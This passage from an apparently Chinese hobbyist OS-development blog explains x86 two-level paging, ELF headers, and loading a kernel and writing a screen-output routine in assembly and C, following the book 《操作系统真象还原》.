title="内存分页"></a>内存分页</h2><p>内存分页解除了线性内存与物理内存一一对应的关系，通过映射关系，将线性地址映射到任意物理地址</p><p>内存分页由CPU提供硬件（页部件）支持，通过建立页表，以及页表查询来实现映射关系，这也是由CPU完成的，毕竟在CPU看来，一切都是慢速设备，不如自己来。当然还得感谢CPU设计师与OS设计师的合作。</p><p>至于什么是映射关系，这个应该不用笔者赘述了</p><h3 id="一级页表"><a href="#一级页表" class="headerlink" title="一级页表"></a>一级页表</h3><p>32位架构的CPU的地址总线的max是4GB</p><p>CPU以4kB为粒度，将内存分为一页页，此为一级页表</p><p>此时我们需要一个地方来存储每页内存的信息，这个地方就是页表（Page Table）。页表中的项称为页表项（ Page Table Entry，PTE ），其大小是 4 字节，页表项的作用是存储内存物理地址。当访问一个线性地址时，实际上就是在访问页表项中所记录的物理内存地址。</p><p>下图为一级页表示意图。来自《操作系统真象还原》</p><p><img src="/img/OS/21.png" alt="img"></p><p>页表项0-11位为页内寻址</p><p>页表项12-31位为该页表项在页表中的<code>index</code></p><p>页表的地址被存放在CR3寄存器中，可以通过CR3寄存器中页表项的物理地址（此时还未开启分页）+ index*4找到目标页表项对应的物理地址，最后加上低12位的偏移，就能访问对应的物理地址</p><p>But，想一下，4GB总内存，以4kB的粒度分，光页表项就有<code>0x100000</code>之多，存储这些页表项就要花费4MB大小的内存。并且每个进程都有独立的页表，光是这些内存就是一笔很大的开销，那怎么办捏？</p><p>一级页表不行，👴再套一层不行🐎</p><p>所以二级页表他来了</p><h3 id="二级页表"><a href="#二级页表" class="headerlink" title="二级页表"></a>二级页表</h3><p>先看一下二级页表示意图。下图来自《操作系统真象还原》</p><p><img src="/img/OS/22.png" alt="img"></p><p>这次CPU学聪明了，先创建一个4KB大小的页目录表，其中存放着1024个页目录项（Page Directory Entry， PDE）。何为页目录项？就是页表的物理地址，页目录项大小同页表项一样，都用来描述一个物理页的物理地址，其大小都是 4 字节。</p><p>页目录表中共 1024 个页表，也就是有 1024 个页目录项 。一个页目录项中记录一个页表物理页地址，物理页地址是指页的物理地址，在页目录项及页表项中记录的都是页的物理地址。</p><p>中间层果然是万能的(bushi)</p><p>二级页表虽然原理与一级页表相同，但是寻址方式发生了一点小变化</p><p>对于一个32位虚拟地址：</p><ul><li>0-11位：页内偏移</li><li>12-21位：PTE索引</li><li>22-31位：PDE索引</li></ul><p>计算公式和一级页表类似</p><p>反正这些公式的计算是<code>CPU</code>帮👴干的</p><p>突然，受尽压榨的<code>CPU</code>发现，这些页表项和页目录项都是以4KB为粒度，也就是说最后12位都是0，反正固定不变的东西，存放点信息不是美滋滋，于是，<code>PTE</code>和<code>PDE</code>就被改造调教开发成了下面的模样🥵。下图来自《操作系统真象还原》</p><p><img src="/img/OS/23.png" alt="img"></p><ul><li>P：present 1：存在内存中&#x2F;0：不存在内存中</li><li>RW：read&#x2F;wirte 1：可读可写&#x2F;0：可读不可写</li><li>US：user&#x2F;super 1：非特权&#x2F;0：特权</li><li>PWT：Page-level Write-Through，页级通写位，置1表示此内存页是高速缓存，此处置0即可</li><li>PCD：Page-level Cache Disable，页级高速缓存禁止位，置1表示此内存页启用高速缓存，此处置0即可</li><li>A：Accessed，访问位 1：被CPU访问过，用来统计访问频率</li><li>D：Dirty，脏页，CPU对一个内存页执行写操作后，会对此内存页对应的页表项D位置1</li><li>PAT：Page Attribute Table，太复杂了，👴不写了</li><li>G：Global，全局位，与下文的TLB有关</li><li>AVL：Available，可用位，但是可不可用跟CPU👴有什么关系</li></ul><h3 id="开启页表"><a href="#开启页表" class="headerlink" title="开启页表"></a>开启页表</h3><p>boot.inc添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----页表物理地址-----<br>PAGE_DIR_TABLE_POS equ 0x100000<br>;-----页表属性-----<br>PG_Pequ 1b<br>PG_RW_Requ 00b<br>PG_RW_Wequ 10b<br>PG_US_S equ 000b<br>PG_US_Uequ 100b<br></code></pre></td></tr></table></figure><p>load.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----前面就是进入PE模式-----<br>call setup_page<br><br>sgdt [gdt_ptr]                                          ;保存当前gdt的值<br>mov ebx, [gdt_ptr + 2]                                  ;使gdt_base和selector3的base加0xc0000000<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS                             ;将页目录表物理地址存进CR3<br>mov cr3, eax<br><br>mov eax, cr0                                            ;开启分页<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]<br>mov byte [gs:160], &#x27;V&#x27;<br><br>jmp $<br><br><br>setup_page:<br>[bits 32]<br>mov ecx,0x1000<br>mov esi,0<br>.clear_page_dir:                                    ;将页目录表清零<br>mov byte[PAGE_DIR_TABLE_POS + esi],0<br>inc esi<br>loop .clear_page_dir<br><br>.create_pde:<br>mov eax, PAGE_DIR_TABLE_POS                     ;第一个页表创建在物理地址0x101000<br>add eax, 0x1000<br>mov ebx, eax<br><br>or eax, PG_US_U | PG_RW_W | PG_P                ;用户权限、可写、存在<br>mov [PAGE_DIR_TABLE_POS + 0x0], eax             ;将index=0 &amp; 768的页目录项赋值为0x101007，c00以上的用于内核空间<br>mov [PAGE_DIR_TABLE_POS+0xc00], eax<br>sub eax, 0x1000<br>mov [PAGE_DIR_TABLE_POS+4092],eax               ;将页目录表的物理地址作为最后一个页目录项<br><br>mov ecx, 256                                    ;将0x100000以下的内存，作为第一个页表中的PTE<br>mov esi, 0<br>mov edx, PG_US_U | PG_RW_W | PG_P<br><br>.create_pte:<br>mov [ebx+esi*4], edx<br>add edx, 0x1000<br>inc esi<br>loop .create_pte<br><br>mov eax, PAGE_DIR_TABLE_POS                         ;将1MB-1GB的内存全部映射到高处，使得内核和操作系统共享同一片物理地址<br>add eax, 0x2000<br>or eax, PG_US_U | PG_RW_W | PG_P<br>mov ebx, PAGE_DIR_TABLE_POS<br>mov ecx, 254<br>mov esi, 769<br><br>.create_kernel_pde:<br>mov [ebx+esi*4], eax<br>inc esi<br>add eax, 0x1000<br>loop .create_kernel_pde<br><br>ret<br></code></pre></td></tr></table></figure><h3 id="虚拟地址访问页表"><a href="#虚拟地址访问页表" class="headerlink" title="虚拟地址访问页表"></a>虚拟地址访问页表</h3><p>用<code>info tab</code>可以查看页表映射</p><p><img src="/img/OS/24.png" alt="img"></p><p>这边解释一下为什么会有这种奇怪的映射，因为页目录表的最后一项页目录项是页表的物理地址，对应虚拟地址的高10位为0x3ff</p><p>此时页目录项为<code>0x100000</code>，最后一个页表项还是原来的页目录项，就是这玩意被用了两次，第一次当页目录项，第二次当页表项，无限套娃。其余两个也是这个思路，所以访问<code>0xfffffXXX</code>的虚拟地址，就能访问页表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xfffff000-0xffffffff -&gt; 0x000000100000-0x000000100fff<br></code></pre></td></tr></table></figure><h3 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h3><p>在二级页表中，从虚拟地址转换到物理地址需要访问三次内存，那三级、四级页表怎么办？对于<code>CPU</code>来说，访问内存无疑是一种降低效率的行为，所以<code>TLB</code>（Translation Lookaside Buffer，快表）就出现了。</p><p><code>TLB</code> 中的条目是虚拟地址的高 20 位到物理地址高 20 位的映射结果。<code>TLB</code>将近期访问的虚拟地址转换成物理地址后，一一对应储存起来，当<code>CPU</code>下一次需要转换时，会先来<code>TLB</code>中查询，查到就直接拿去用，如果没查到对应的物理地址，会在转换后更新<code>TLB</code>。</p><p>可以使用<code>invlpg</code>指令更新<code>TLB</code></p><h2 id="load-kernel！"><a href="#load-kernel！" class="headerlink" title="load kernel！"></a>load kernel！</h2><p>对于linux kernel，并不采用纯汇编的方式来编写（虽然这8是8行😅），将C和汇编结合起来会更便于理解</p><p>因为我们是在linux操作系统中，kernel的文件格式是elf，所以在loader kernel文件前，我们还需要对elf文件有足够了解</p><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>ELF，Executable and Linkable Format，可执行链接格式。</p><p>ELF文件提供了两种文件视图，链接格式视图和执行格式视图。链接视图是以节（section）为单位，执行视图是以段（segment）为单位。接视图就是在链接时用到的视图，而执行视图则是在执行时用到的视图。</p><p><img src="/img/OS/25.png" alt="img"></p><p>先来看看elf header</p><h4 id="ELF-header"><a href="#ELF-header" class="headerlink" title="ELF header"></a>ELF header</h4><p>ELF header位于文件的开始位置，它的主要目的是定位文件的其他部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_hdr<br>&#123;<br>  unsigned chare_ident[EI_NIDENT];/* Magic number and other info */<br>  Elf32_Halfe_type;/* Object file type */<br>  Elf32_Halfe_machine;/* Architecture */<br>  Elf32_Worde_version;/* Object file version */<br>  Elf32_Addre_entry;/* Entry point virtual address */<br>  Elf32_Offe_phoff;/* Program header table file offset */<br>  Elf32_Offe_shoff;/* Section header table file offset */<br>  Elf32_Worde_flags;               /* Processor-specific flags */<br>  Elf32_Halfe_ehsize;/* ELF header size in bytes */<br>  Elf32_Halfe_phentsize;/* Program header table entry size */<br>  Elf32_Halfe_phnum;/* Program header table entry count */<br>  Elf32_Halfe_shentsize;/* Section header table entry size */<br>  Elf32_Halfe_shnum;/* Section header table entry count */<br>  Elf32_Halfe_shstrndx;/* Section header string table index */<br>&#125; Elf32_Ehdr;<br></code></pre></td></tr></table></figure><p><strong>e_ident：</strong>16字节，含义如下图</p><p><img src="/img/OS/27.png" alt="img"></p><p><strong>e_type：</strong>2字节，文件类型，类型有以下几个</p><p><img src="/img/OS/28.png" alt="img"></p><p><strong>e_machine：</strong>2字节，文件架构，有以下几个架构</p><p><img src="/img/OS/29.png" alt="img"></p><p>用<code>readelf -h</code>即可查看elf header详细信息</p><p><img src="/img/OS/26.png" alt="img"></p><h4 id="Program-header-table"><a href="#Program-header-table" class="headerlink" title="Program header table"></a>Program header table</h4><p>位于elf header之后，程序头表(Program header table)列举了有效的段(segments)和他们的属性（执行视图）</p><p>程序头是一个结构的数组，每一个结构都表示一个段(segments)。在可执行文件或者共享链接库中所有的节(sections)都被分为不同的几个段(segments)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_phdr&#123;<br>  Elf32_Wordp_type;   <br>  Elf32_Off    p_offset;<br>  Elf32_Addrp_vaddr;<br>  Elf32_Addrp_paddr;<br>  Elf32_Wordp_filesz;<br>  Elf32_Wordp_memsz;<br>  Elf32_Wordp_flags;<br>  Elf32_Wordp_align;<br>&#125; Elf32_Phdr;<br></code></pre></td></tr></table></figure><p>程序头的索引地址(e_phoff)、段数量(e_phnum)、表项大小(e_phentsize)都是通过 ELF头部信息获取的。</p><p><strong>p_type：</strong>指明该段的类型</p><p><img src="/img/OS/30.png" alt="img"></p><p><strong>p_flags：</strong>指明该段的标志</p><p><img src="/img/OS/31.png" alt="img"></p><p>下图画红线的0x20字节便是一个程序头表</p><p><img src="/img/OS/32.png" alt="img"></p><p>当然，也可以使用<code>readelf -l</code>得到详细信息</p><p><img src="/img/OS/33.png" alt="img"></p><p>以上，便是elf文件浅析</p><h3 id="now-lets’s-go"><a href="#now-lets’s-go" class="headerlink" title="now lets’s go!"></a>now lets’s go!</h3><p>先随便写个kernel，内联汇编用起来还是爽的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#include &lt;stdio.h&gt;<br><br>int main(void)<br>&#123;<br>while(1)<br>&#123;<br>asm(<br>    &quot;mov byte ptr [gs:170], &#x27;W&#x27;;&quot;<br>    &quot;mov byte ptr [gs:172], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:174], &#x27;L&#x27;;&quot;<br>    &quot;mov byte ptr [gs:176], &#x27;C&#x27;;&quot;<br>    &quot;mov byte ptr [gs:178], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:180], &#x27;M&#x27;;&quot;<br>    &quot;mov byte ptr [gs:182], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:184], &#x27; &#x27;;&quot;<br>    &quot;mov byte ptr [gs:186], &#x27;k&#x27;;&quot;<br>    &quot;mov byte ptr [gs:188], &#x27;o&#x27;;&quot;<br>    &quot;mov byte ptr [gs:190], &#x27;r&#x27;;&quot;<br>    &quot;mov byte ptr [gs:192], &#x27;e&#x27;;&quot;<br>    &quot;mov byte ptr [gs:194], &#x27;y&#x27;;&quot;<br>    &quot;mov byte ptr [gs:196], &#x27;&#x27;&#x27;;&quot;<br>    &quot;mov byte ptr [gs:198], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:200], &#x27;S&#x27;;&quot;<br>);<br>&#125;<br>return 0;    <br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要将kernel载入到内存中，完成解析，书中是将kernel载入到0x70000处，解析程序入口到0x1500处，笔者也就照着来了。</p><p>用脚本完成编译链接，0x1500对应的虚拟地址为0xc0001500</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>gcc -m32 -c ./kernel/kernel.c -o ./kernel/kernel.o -masm=intel<br>ld -melf_i386 ./kernel/kernel.o -Ttext 0xc0001500 -e main -o ./kernel/kernel.bin<br></code></pre></td></tr></table></figure><p>完成载入和解析后，便可以跳到kernel处，load的任务就结束了（我的任务完成啦🤪）</p><p>以下便是代码的变化</p><p><strong>boot.inc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----add-----<br>KERNEL_START_SECTORequ 0x9<br>KERNEL_BIN_BASE_ADDRequ 0x70000<br>KERNEL_ENTRY_POINTequ 0xc0001500<br>PT_NULLequ 0<br></code></pre></td></tr></table></figure><p><strong>pack.sh</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./kernel/kernel.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=200 <span class="hljs-attribute">seek</span>=9 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p><strong>load.s</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;开启保护模式......<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov eax, KERNEL_START_SECTOR<br>mov ebx, KERNEL_BIN_BASE_ADDR<br>mov ecx, 200<br>call rd_disk_m_32                       ;和rd_dsik_m_16一样，寄存器换成32位就行<br><br>call setup_page                         <br><br>sgdt [gdt_ptr]<br>mov ebx, [gdt_ptr + 2]<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS<br>mov cr3, eax<br><br>mov eax, cr0<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]                          ;开启分页<br><br>jmp SELECTOR_CODE:enter_kernel          ;刷新流水线，虽然不刷也莫得关系<br><br>enter_kernel:<br>call kernel_init<br>mov esp, 0xc009f000<br>jmp KERNEL_ENTRY_POINT<br><br><br>;......<br>kernel_init:<br>[bits 32]<br>xor eax, eax<br>xor ebx, ebx<br>xor ecx, ecx<br>xor edx, edx<br><br>mov dx, [KERNEL_BIN_BASE_ADDR + 42]         ;length of program header<br>mov ebx, [KERNEL_BIN_BASE_ADDR + 28]        <br>add ebx, KERNEL_BIN_BASE_ADDR               ;program header table start address<br>mov cx, [KERNEL_BIN_BASE_ADDR+44]           ;count of program header<br><br>.each_segment:<br>cmp byte[ebx + 0],PT_NULL               ;if [ebx+0] == 0,the program header is empty<br>je .PTNULL<br><br>push dword [ebx + 16]                   ;segment size<br>mov eax, [ebx+4]<br>add eax, KERNEL_BIN_BASE_ADDR<br>push eax                                ;src<br>push dword [ebx + 8]                    ;dst<br><br>call mem_cpy<br>add esp, 12                             ;recover<br><br>.PTNULL:<br>add ebx, edx                            ;next program header<br>loop .each_segment<br>ret<br><br>mem_cpy:                                     ;模仿memcpy函数，待我去看看memcpy源码<br>cld<br>push ebp<br>mov ebp, esp<br>push ecx<br><br>mov edi, [ebp+8]<br>mov esi, [ebp+12]<br>mov ecx, [ebp+16]<br>rep movsb                                ;将ds:esi处size为ecx的data，复制到es:edi处，逐字节拷贝<br><br>pop ecx<br>leave                                    ;恢复栈帧<br>ret<br></code></pre></td></tr></table></figure><p>最后的效果的就是这样</p><p><img src="/img/OS/34.png" alt="img"></p><h1 id="0x4-实现自己的输出函数"><a href="#0x4-实现自己的输出函数" class="headerlink" title="0x4:实现自己的输出函数"></a>0x4:实现自己的输出函数</h1><p>在此之前，我们在屏幕上输出，要么是依靠BIOS中断，要么是直接对显存进行操作</p><p>但我们是什么，是尊贵的kernel！输出这件事，应该只要轻轻的call一个function，就能完成</p><p>所以，是时候写一个输出函数了（虽然只是对显存操作测封装罢了🤔）</p><h2 id="单个字符输出"><a href="#单个字符输出" class="headerlink" title="单个字符输出"></a>单个字符输出</h2><p>print.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs assembly">TI_GDTequ 0<br>RPL0 equ 0<br>SELECTOR_VIDEOequ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>[bits 32]<br>section .text<br><br>global put_char<br><br>put_char:<br>[bits 32]<br>pushad                                     ;保存寄存器的值<br>mov ax, SELECTOR_VIDEO<br>mov gs, ax<br><br>mov dx, 0x3d4                              ;获取光标的值<br>mov al, 0x0e<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br>mov ah, al<br><br>mov dx, 0x3d4<br>mov al, 0x0f<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br><br>mov bx, ax<br>mov ecx, [esp+36]                           ;将要输出字符的ascii码值给ecx<br><br>cmp cl, 0x0d<br>jz .is_carriage_return<br>cmp cl, 0xa<br>jz .is_line_feed           <br><br>cmp cl, 0x8<br>jz .is_backspace<br>jmp .put_other<br><br>;-----退格-----<br>.is_backspace:<br>[bits 32]<br>dec bx<br>shl bx, 1<br><br>mov byte [gs:bx], 0x20<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>jmp .set_cursor<br><br><br>.put_other:<br>        [bits 32]<br>shl bx, 1<br>mov [gs:bx], cl<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>inc bx<br>cmp bx, 2000<br>jl .set_cursor<br><br>;-----换行-----<br>.is_line_feed:<br>[bits 32]<br>add bx, 80<br>cmp bx, 2000<br>jl .set_cursor<br>;-----回车-----<br>.is_carriage_return:<br>[bits 32]<br>xor dx, dx<br>mov ax, bx<br>mov si, 80<br>div si<br>sub bx, dx<br><br>jmp .set_cursor<br><br>;-----滚屏-----<br>.roll_screen:                                   ;简单来说，就是把1-24的data移动到0-23行，因为我们无需考虑缓存问题<br>[bits 32]                                 <br>cld <br>mov eax, 960                                ;960*4 = 3840<br><br>mov esi, 0xc00b80a0                         ;第1行<br>mov edi, 0xc00b8000                         ;第0行<br>rep movsd                                   ;4字节4字节移动<br><br>mov ebx, 3840                               ;第24行第一个光标的值<br>mov ecx, 80<br><br>.cls:                                       ;使最后一行为空白行<br>[bits 32]<br>mov word [gs:ebx], 0x720<br>add ebx, 2<br>loop .cls<br>mov bx, 1920<br>;-----存储当前光标的值-----<br>.set_cursor:<br>[bits 32]<br>mov dx, 0x3d4<br>mov al,0x0e<br>out dx, al<br>mov dx, 0x03d5<br>mov al, bh<br>out dx, al<br><br>mov dx, 0x3d4<br>mov al, 0xf<br>out dx,al<br>mov dx, 0x03d5<br>mov al, bl<br>out dx, al<br>;-----恢复寄存器状态-----<br>.put_char_done:<br>[bits 32]<br>popad<br>ret<br><br></code></pre></td></tr></table></figure><p>在显存的文本显示模式中，两个字节显示一个字符——一字节为字符的值，一字节为字符的属性。所以获取光标的值*2才是对应字符在显存中的偏移。</p><p>bochs的屏幕，可以容纳80*25共2000个字符，占据4000字节，所以换行就是简单粗暴的光标值+80，回车是当前光标值 - （当前光标值对80取模）。至于滚行的原理，就是简单粗暴的把1-24行移动到0-23行，突出一个不考虑缓存🤪</p><h2 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h2><p>好吧其实就是对单个字符输出的封装呜呜</p><p>print.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIB_KERNEL_PRINT_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _LIB_KERNEL_PRINT_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdint.h&quot;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">put_char</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> char_csci)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">put_str</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>print.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 